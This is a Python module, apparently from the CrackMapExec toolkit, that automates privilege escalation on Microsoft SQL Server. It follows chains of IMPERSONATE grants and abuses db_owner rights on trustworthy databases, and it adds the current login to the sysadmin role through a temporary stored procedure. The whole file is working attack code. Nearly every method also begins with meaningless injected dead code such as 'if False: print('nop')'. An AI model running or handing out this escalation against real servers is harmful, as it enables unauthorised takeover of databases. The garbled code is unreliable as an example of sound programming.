from cme.helpers.logger import highlight

class User:

    def __init__(self, username):
        if False:
            for i in range(10):
                print('nop')
        self.username = username
        self.grantors = []
        self.parent = None
        self.is_sysadmin = False
        self.dbowner = None

    def __str__(self):
        if False:
            return 10
        return f'User({self.username})'

class CMEModule:
    """
    Enumerate MSSQL privileges and exploit them
    """
    name = 'mssql_priv'
    description = 'Enumerate and exploit MSSQL privileges'
    supported_protocols = ['mssql']
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        if False:
            i = 10
            return i + 15
        self.admin_privs = None
        self.current_user = None
        self.current_username = None
        self.mssql_conn = None
        self.action = None
        self.context = None

    def options(self, context, module_options):
        if False:
            for i in range(10):
                print('nop')
        '\n        ACTION    Specifies the action to perform:\n            - enum_priv (default)\n            - privesc\n            - rollback (remove sysadmin privilege)\n        '
        self.action = None
        self.context = context
        if 'ACTION' in module_options:
            self.action = module_options['ACTION']

    def on_login(self, context, connection):
        if False:
            i = 10
            return i + 15
        self.mssql_conn = connection.conn
        self.current_username = self.get_current_username()
        self.current_user = User(self.current_username)
        self.current_user.is_sysadmin = self.is_admin()
        self.current_user.dbowner = self.check_dbowner_privesc()
        if self.action == 'rollback':
            if not self.current_user.is_sysadmin:
                self.context.log.fail(f'{self.current_username} is not sysadmin')
                return
            if self.remove_sysadmin_priv():
                self.context.log.success('sysadmin role removed')
            else:
                self.context.log.success('failed to remove sysadmin role')
            return
        if self.current_user.is_sysadmin:
            self.context.log.success(f'{self.current_username} is already a sysadmin')
            return
        self.perform_impersonation_check(self.current_user)
        target_user = self.browse_path(context, self.current_user, self.current_user)
        if self.action == 'privesc':
            if not target_user:
                self.context.log.fail("can't find any path to privesc")
            else:
                exec_as = self.build_exec_as_from_path(target_user)
                if target_user.is_sysadmin:
                    self.do_impersonation_privesc(self.current_username, exec_as)
                elif target_user.dbowner:
                    self.do_dbowner_privesc(target_user.dbowner, exec_as)
            if self.is_admin_user(self.current_username):
                self.context.log.success(f'{self.current_username} is now a sysadmin! ' + highlight('({})'.format(self.context.conf.get('CME', 'pwn3d_label'))))

    def build_exec_as_from_path(self, target_user):
        if False:
            return 10
        path = [target_user.username]
        parent = target_user.parent
        while parent:
            path.append(parent.username)
            parent = parent.parent
        path.pop(-1)
        return self.sql_exec_as(reversed(path))

    def browse_path(self, context, initial_user: User, user: User) -> User:
        if False:
            i = 10
            return i + 15
        if initial_user.is_sysadmin:
            self.context.log.success(f'{initial_user.username} is sysadmin')
            return initial_user
        elif initial_user.dbowner:
            self.context.log.success(f'{initial_user.username} can privesc via dbowner')
            return initial_user
        for grantor in user.grantors:
            if grantor.is_sysadmin:
                self.context.log.success(f'{user.username} can impersonate: {grantor.username} (sysadmin)')
                return grantor
            elif grantor.dbowner:
                self.context.log.success(f'{user.username} can impersonate: {grantor.username} (which can privesc via dbowner)')
                return grantor
            else:
                self.context.log.display(f'{user.username} can impersonate: {grantor.username}')
            return self.browse_path(context, initial_user, grantor)

    def query_and_get_output(self, query):
        if False:
            print('Hello World!')
        results = self.mssql_conn.sql_query(query)
        return results

    def sql_exec_as(self, grantors: list) -> str:
        if False:
            return 10
        exec_as = []
        for grantor in grantors:
            exec_as.append(f"EXECUTE AS LOGIN = '{grantor}';")
        return ''.join(exec_as)

    def perform_impersonation_check(self, user: User, grantors=[]):
        if False:
            print('Hello World!')
        exec_as = self.sql_exec_as(grantors)
        if self.update_priv(user, exec_as):
            return
        new_grantors = self.get_impersonate_users(exec_as)
        for new_grantor in new_grantors:
            if new_grantor == user.username:
                continue
            if new_grantor not in grantors:
                new_user = User(new_grantor)
                new_user.parent = user
                user.grantors.append(new_user)
                grantors.append(new_grantor)
                self.perform_impersonation_check(new_user, grantors)

    def update_priv(self, user: User, exec_as=''):
        if False:
            i = 10
            return i + 15
        if self.is_admin_user(user.username):
            user.is_sysadmin = True
            return True
        user.dbowner = self.check_dbowner_privesc(exec_as)
        return user.dbowner

    def get_current_username(self) -> str:
        if False:
            print('Hello World!')
        return self.query_and_get_output('select SUSER_NAME()')[0]['']

    def is_admin(self, exec_as='') -> bool:
        if False:
            i = 10
            return i + 15
        res = self.query_and_get_output(exec_as + "SELECT IS_SRVROLEMEMBER('sysadmin')")
        self.revert_context(exec_as)
        is_admin = res[0]['']
        self.context.log.debug(f'IsAdmin Result: {is_admin}')
        if is_admin:
            self.context.log.debug(f'User is admin!')
            self.admin_privs = True
            return True
        else:
            return False

    def get_databases(self, exec_as='') -> list:
        if False:
            print('Hello World!')
        res = self.query_and_get_output(exec_as + 'SELECT name FROM master..sysdatabases')
        self.revert_context(exec_as)
        self.context.log.debug(f'Response: {res}')
        self.context.log.debug(f'Response Type: {type(res)}')
        tables = [table['name'] for table in res]
        return tables

    def is_dbowner(self, database, exec_as='') -> bool:
        if False:
            print('Hello World!')
        query = f"select rp.name as database_role\n      from [{database}].sys.database_role_members drm\n      join [{database}].sys.database_principals rp\n        on (drm.role_principal_id = rp.principal_id)\n      join [{database}].sys.database_principals mp\n        on (drm.member_principal_id = mp.principal_id)\n      where rp.name = 'db_owner' and mp.name = SYSTEM_USER"
        self.context.log.debug(f'Query: {query}')
        res = self.query_and_get_output(exec_as + query)
        self.context.log.debug(f'Response: {res}')
        self.revert_context(exec_as)
        if res:
            if 'database_role' in res[0] and res[0]['database_role'] == 'db_owner':
                return True
            else:
                return False
        return False

    def find_dbowner_priv(self, databases, exec_as='') -> list:
        if False:
            i = 10
            return i + 15
        match = []
        for database in databases:
            if self.is_dbowner(database, exec_as):
                match.append(database)
        return match

    def find_trusted_db(self, exec_as='') -> list:
        if False:
            i = 10
            return i + 15
        query = "SELECT d.name AS DATABASENAME\n    FROM sys.server_principals r\n    INNER JOIN sys.server_role_members m\n        ON r.principal_id = m.role_principal_id\n    INNER JOIN sys.server_principals p ON\n    p.principal_id = m.member_principal_id\n    inner join sys.databases d\n        on suser_sname(d.owner_sid) = p.name\n    WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB')\n        and r.type = 'R' and r.name = N'sysadmin'"
        res = self.query_and_get_output(exec_as + query)
        self.revert_context(exec_as)
        return res

    def check_dbowner_privesc(self, exec_as=''):
        if False:
            for i in range(10):
                print('nop')
        databases = self.get_databases(exec_as)
        dbowner = self.find_dbowner_priv(databases, exec_as)
        trusted_db = self.find_trusted_db(exec_as)
        for db in dbowner:
            if db in trusted_db:
                return db
        return None

    def do_dbowner_privesc(self, database, exec_as=''):
        if False:
            return 10
        self.query_and_get_output(exec_as)
        self.query_and_get_output(f'use {database};')
        query = f"CREATE PROCEDURE sp_elevate_me\n            WITH EXECUTE AS OWNER\n            as\n            begin\n            EXEC sp_addsrvrolemember '{self.current_username}','sysadmin'\n            end"
        self.query_and_get_output(query)
        self.query_and_get_output('EXEC sp_elevate_me;')
        self.query_and_get_output('DROP PROCEDURE sp_elevate_me;')
        self.revert_context(exec_as)

    def do_impersonation_privesc(self, username, exec_as=''):
        if False:
            print('Hello World!')
        self.query_and_get_output(exec_as)
        self.query_and_get_output(f"EXEC sp_addsrvrolemember '{username}', 'sysadmin'")
        self.revert_context(exec_as)

    def get_impersonate_users(self, exec_as='') -> list:
        if False:
            while True:
                i = 10
        query = "SELECT DISTINCT b.name\n                   FROM  sys.server_permissions a\n                   INNER JOIN sys.server_principals b\n                   ON a.grantor_principal_id = b.principal_id\n                   WHERE a.permission_name like 'IMPERSONATE%'"
        res = self.query_and_get_output(exec_as + query)
        self.revert_context(exec_as)
        users = [user['name'] for user in res]
        return users

    def remove_sysadmin_priv(self) -> bool:
        if False:
            i = 10
            return i + 15
        res = self.query_and_get_output(f"EXEC sp_dropsrvrolemember '{self.current_username}', 'sysadmin'")
        return not self.is_admin()

    def is_admin_user(self, username) -> bool:
        if False:
            for i in range(10):
                print('nop')
        res = self.query_and_get_output(f"SELECT IS_SRVROLEMEMBER('sysadmin', '{username}')")
        try:
            if int(res):
                self.admin_privs = True
                return True
            else:
                return False
        except:
            return False

    def revert_context(self, exec_as):
        if False:
            for i in range(10):
                print('nop')
        self.query_and_get_output('REVERT;' * exec_as.count('EXECUTE'))